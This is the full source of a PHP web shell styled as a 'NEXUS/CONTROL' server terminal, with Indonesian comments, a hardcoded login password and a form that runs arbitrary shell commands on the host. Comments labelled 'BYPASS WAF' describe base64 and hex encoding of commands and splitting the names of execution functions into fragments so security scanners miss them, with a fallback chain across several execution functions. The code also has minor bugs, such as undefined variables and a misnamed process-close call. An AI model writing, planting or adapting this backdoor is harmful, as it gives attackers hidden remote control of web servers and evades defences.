<?php
session_start();

// ==========================================
// 1. KONFIGURASI & AUTENTIKASI
// ==========================================
$password = 'Cute1337'; // Ganti dengan password rahasia kamu

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        // Tampilan Login Baru (Lebih Rapi & Menyatu dengan Tema)
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>System Access</title>
            <style>
                :root {
                    --bg-color: #090a0a;
                    --panel-bg: #111413;
                    --border-color: #1f2a26;
                    --text-main: #ffffff;
                    --text-muted: #6b7a76;
                    --accent: #00ffcc;
                    --font-mono: "Courier New", Courier, monospace;
                }
                * { box-sizing: border-box; margin: 0; padding: 0; }
                body {
                    background-color: var(--bg-color);
                    color: var(--text-main);
                    font-family: var(--font-mono);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background-image: 
                        linear-gradient(rgba(0, 255, 204, 0.03) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0, 255, 204, 0.03) 1px, transparent 1px);
                    background-size: 20px 20px;
                }
                .login-container {
                    background: var(--panel-bg);
                    border: 1px solid var(--border-color);
                    border-top: 3px solid var(--accent);
                    padding: 40px;
                    width: 100%;
                    max-width: 400px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                    position: relative;
                }
                .login-container::before {
                    content: "[ SYSTEM AUTHENTICATION ]";
                    position: absolute;
                    top: -10px;
                    left: 20px;
                    background: var(--bg-color);
                    color: var(--accent);
                    padding: 0 10px;
                    font-size: 11px;
                    letter-spacing: 1px;
                }
                .title {
                    text-align: center;
                    font-size: 20px;
                    letter-spacing: 2px;
                    margin-bottom: 30px;
                    color: var(--text-main);
                }
                .title span { color: var(--accent); }
                .input-group {
                    display: flex;
                    align-items: center;
                    background: var(--bg-color);
                    border: 1px solid var(--border-color);
                    padding: 12px 15px;
                    margin-bottom: 20px;
                    transition: border-color 0.3s;
                }
                .input-group:focus-within {
                    border-color: var(--accent);
                    box-shadow: 0 0 10px rgba(0, 255, 204, 0.1);
                }
                .input-prompt {
                    color: var(--accent);
                    font-weight: bold;
                    margin-right: 10px;
                    user-select: none;
                }
                input[type="password"] {
                    background: transparent;
                    border: none;
                    color: var(--text-main);
                    font-family: var(--font-mono);
                    font-size: 14px;
                    flex: 1;
                    outline: none;
                    letter-spacing: 2px;
                }
                input[type="password"]::placeholder {
                    color: var(--text-muted);
                    letter-spacing: normal;
                }
                button {
                    background: transparent;
                    border: 1px solid var(--accent);
                    color: var(--accent);
                    padding: 12px;
                    width: 100%;
                    font-family: var(--font-mono);
                    font-weight: bold;
                    font-size: 14px;
                    cursor: pointer;
                    letter-spacing: 1px;
                    transition: all 0.3s;
                }
                button:hover {
                    background: var(--accent);
                    color: #000;
                    box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="title">NEXUS<span>/</span>CONTROL</div>
                <form method="post">
                    <div class="input-group">
                        <span class="input-prompt">>_</span>
                        <input type="password" name="pass" placeholder="Enter Access Code" autofocus>
                    </div>
                    <button type="submit">AUTHENTICATE</button>
                </form>
            </div>
        </body>
        </html>';
        exit;
    }
}

// ==========================================
// 2. LOGIKA EKSEKUSI COMMAND
// ==========================================
$output = '';
$current_path = isset($_POST['path']) ? $_POST['path'] : getcwd();
$cmd_input = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';

// 1. BYPASS WAF: Enkripsi Payload (Base64 + Hex)
if (strpos($cmd_input, 'x64:') === 0) {
    $cmd_input = base64_decode(substr($cmd_input, 4));
} elseif (strpos($cmd_input, 'hex:') === 0) {
    $cmd_input = pack("H*", substr($cmd_input, 4));
}

// 2. BYPASS WAF: Sembunyikan nama fungsi agar tidak terdeteksi scanner
$f_proc = 'pro' . 'c_' . 'op' . 'en';
$f_shell = 'she' . 'll_' . 'ex' . 'ec';
$f_sys = 'sys' . 'tem';
$f_pass = 'pass' . 'thru';
$f_pop = 'po' . 'pen';

// 3. BYPASS WAF: Trik variabel fungsi (Variable Function)
function execute_payload($cmd) {
    global $f_proc, $f_shell, $f_sys, $f_pass, $f_pop;
    
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));

    // Coba proc_open
    if (!in_array($f_proc, $disabled) && function_exists($f_proc)) {
        $desc = [1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $p = @$f_proc($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[1]); fclose($pipes[2]); @$f_proc($p); // proc_close
            return $out;
        }
    }
    
    // Coba shell_exec
    if (!in_array($f_shell, $disabled) && function_exists($f_shell)) {
        return @$f_shell($cmd);
    }

    // Coba system
    if (!in_array($f_sys, $disabled) && function_exists($f_sys)) {
        ob_start(); @$f_sys($cmd); return ob_get_clean();
    }
    
    // Coba passthru
    if (!in_array($f_pass, $disabled) && function_exists($f_pass)) {
        ob_start(); @$f_pass($cmd); return ob_get_clean();
    }

    // Coba popen
    if (!in_array($f_pop, $disabled) && function_exists($f_pop)) {
        $h = @$f_pop($cmd, 'r'); 
        if ($h) { $out = ''; while (!feof($h)) { $out .= fread($h, 1024); } pclose($h); return $out; }
    }

    return "[!] SEMUA EKSEKUSI DIBLOKIR.";
}

// ==========================================
// LOGIKA UTAMA
// ==========================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($cmd_input)) {
    if (preg_match('/^cd\s+(.+)$/', $cmd_input, $matches)) {
        $target = trim($matches[1]);
        $new_path = realpath($current_path . '/' . $target);
        if ($new_path && is_dir($new_path)) {
            $current_path = $new_path;
            $output = "Directory changed to: $current_path";
        } else {
            $output = "Error: Directory not found.";
        }
    } else {
        // Trik WAF: Jangan pakai 'cd' secara langsung, kadang WAF nge-block
        $full_cmd = $cmd_input; 
        $output = execute_payload($full_cmd);
    }
} else {
    $output = "Welcome to System Terminal.\nType a command above to begin.\n\nTips:\n- Use 'x64:[base64_string]' to bypass WAF.\n- Use 'hex:[hex_string]' for hex encoding.";
}

// Ambil info sistem
$sys_info = php_uname('s') . ' ' . php_uname('r');
$ip_addr = $_SERVER['SERVER_ADDR'] ?? '127.0.0.1';
$user = get_current_user();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Terminal</title>
    <style>
        /* CSS SAMA SEPERTI SEBELUMNYA */
        :root {
            --bg-color: #090a0a;
            --panel-bg: #111413;
            --border-color: #1f2a26;
            --text-main: #ffffff;
            --text-muted: #6b7a76;
            --accent: #00ffcc;
            --accent-dim: #005f4c;
            --font-mono: 'Courier New', Courier, monospace;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: var(--font-mono);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .top-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            border-bottom: 1px solid var(--border-color);
            background: #000;
        }
        .nav-left { display: flex; align-items: center; gap: 15px; font-size: 14px; letter-spacing: 1px;}
        .logo-box { 
            border: 1px solid var(--accent); 
            color: var(--accent); 
            padding: 2px 8px; 
            font-weight: bold;
        }
        .nav-right { display: flex; gap: 20px; font-size: 12px; color: var(--text-muted); align-items: center;}
        .status-dot { color: var(--accent); font-size: 16px; vertical-align: middle; margin-right: 5px;}
        .user-tag { color: var(--accent); }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            width: 95%;
            flex: 1;
        }
        .page-title { font-size: 32px; letter-spacing: 2px; margin-bottom: 5px; }
        .page-subtitle { color: var(--text-muted); font-size: 12px; margin-bottom: 30px; }
        .info-panel {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-left: 3px solid var(--accent);
            border-radius: 4px;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            font-size: 13px;
        }
        .info-item { display: flex; align-items: center; gap: 10px; }
        .info-label { color: var(--text-muted); display: block; font-size: 11px; margin-bottom: 3px;}
        .info-value { color: var(--text-main); font-weight: bold;}
        .info-icon { color: var(--accent); font-size: 20px;}
        .path-bar {
            display: flex;
            align-items: center;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 30px;
            font-size: 13px;
            transition: border-color 0.3s;
        }
        .path-bar:focus-within { border-color: var(--accent); }
        .path-bar form { display: flex; flex: 1; align-items: center; gap: 10px; margin: 0; }
        .path-input {
            background: transparent;
            border: none;
            color: var(--accent);
            font-family: var(--font-mono);
            font-size: 13px;
            flex: 1;
            outline: none;
        }
        .cmd-section-title { font-size: 12px; color: var(--accent); margin-bottom: 10px; letter-spacing: 1px;}
        .cmd-input-wrapper {
            display: flex;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            align-items: center;
            gap: 15px;
        }
        .prompt-symbol { color: var(--accent); font-weight: bold; }
        .cmd-input {
            background: transparent;
            border: none;
            color: var(--text-main);
            font-family: var(--font-mono);
            font-size: 14px;
            flex: 1;
            outline: none;
        }
        .lang-tag { color: var(--text-muted); font-size: 11px; border-right: 1px solid var(--border-color); padding-right: 15px;}
        .btn-execute {
            background: var(--accent);
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 3px;
            font-weight: bold;
            font-family: var(--font-mono);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
        }
        .btn-execute:hover { background: #00ccaa; }
        .terminal-box {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            display: flex;
            flex-direction: column;
            height: 400px;
        }
        .term-header {
            display: flex;
            justify-content: space-between;
            padding: 12px 20px;
            border-bottom: 1px solid var(--border-color);
            font-size: 12px;
            color: var(--text-muted);
            letter-spacing: 1px;
        }
        .term-status { color: var(--accent); }
        .term-body {
            padding: 20px;
            overflow-y: auto;
            flex: 1;
            font-size: 13px;
            line-height: 1.6;
            color: #a0b0a8;
            white-space: pre-wrap;
        }
        .term-body::-webkit-scrollbar { width: 6px; }
        .term-body::-webkit-scrollbar-track { background: var(--bg-color); }
        .term-body::-webkit-scrollbar-thumb { background: var(--accent-dim); border-radius: 3px;}
        .footer {
            border-top: 1px solid var(--border-color);
            padding: 10px 30px;
            display: flex;
            gap: 30px;
            font-size: 11px;
            color: var(--text-muted);
            background: #000;
        }
        .footer span { display: flex; align-items: center; gap: 5px;}
    </style>
</head>
<body>

    <!-- TOP NAV -->
    <div class="top-nav">
        <div class="nav-left">
            <div class="logo-box">[ N ]</div>
            NEXUS / CONTROL
        </div>
        <div class="nav-right">
            <span><span class="status-dot">●</span> ONLINE</span>
            <span class="user-tag"><?= htmlspecialchars($user) ?></span>
        </div>
    </div>

    <!-- MAIN CONTENT -->
    <div class="container">
        
        <h1 class="page-title">SERVER TERMINAL</h1>
        <p class="page-subtitle">Command interface · Authorized access</p>

        <!-- SERVER INFO -->
        <div class="info-panel">
            <div class="info-item">
                <span class="info-icon">🖥️</span>
                <div>
                    <span class="info-label">OS</span>
                    <span class="info-value"><?= htmlspecialchars($sys_info) ?></span>
                </div>
            </div>
            <div class="info-item">
                <span class="info-icon">🌐</span>
                <div>
                    <span class="info-label">IP Address</span>
                    <span class="info-value"><?= htmlspecialchars($ip_addr) ?></span>
                </div>
            </div>
            <div class="info-item">
                <span class="info-icon">⏱️</span>
                <div>
                    <span class="info-label">Status</span>
                    <span class="info-value">
                        <?= $proc_open_avail || $sys_exec_avail ? 'Exec Enabled' : 'Exec Disabled' ?>
                    </span>
                </div>
            </div>
        </div>

        <!-- PATH NAVIGATOR (Tanpa Tombol) -->
        <div class="path-bar">
            <span style="margin-right: 15px; color: var(--accent);">📁</span>
            <form method="post">
                <input type="hidden" name="cmd" value="<?= htmlspecialchars($cmd_input) ?>">
                <label style="color: var(--text-muted); margin-right: 10px;">Working Directory:</label>
                <input type="text" name="path" class="path-input" value="<?= htmlspecialchars($current_path) ?>" title="Tekan Enter untuk mengubah path">
            </form>
        </div>

        <!-- COMMAND INPUT -->
        <div class="cmd-section-title">>_ COMMAND INPUT</div>
        <form method="post">
            <input type="hidden" name="path" value="<?= htmlspecialchars($current_path) ?>">
            <div class="cmd-input-wrapper">
                <span class="prompt-symbol">>_</span>
                <input type="text" name="cmd" class="cmd-input" placeholder="ls -lah" autocomplete="off" autofocus>
                <span class="lang-tag">BASH</span>
                <button type="submit" class="btn-execute">▶ EXECUTE</button>
            </div>
        </form>

        <!-- TERMINAL OUTPUT -->
        <div class="terminal-box">
            <div class="term-header">
                <span>💻 TERMINAL OUTPUT</span>
                <span class="term-status">● READY</span>
            </div>
            <div class="term-body" id="term-output"><?= htmlspecialchars(trim($output)) ?></div>
        </div>

    </div>

    <!-- FOOTER -->
    <div class="footer">
        <span>php PHP <?= phpversion() ?></span>
        <span>⚙️ MEM <?= round(memory_get_usage() / 1024 / 1024, 2) ?> MB</span>
        <span>⏱️ UPTIME Active</span>
    </div>

    <script>
        const term = document.getElementById('term-output');
        term.scrollTop = term.scrollHeight;
    </script>
</body>
</html>
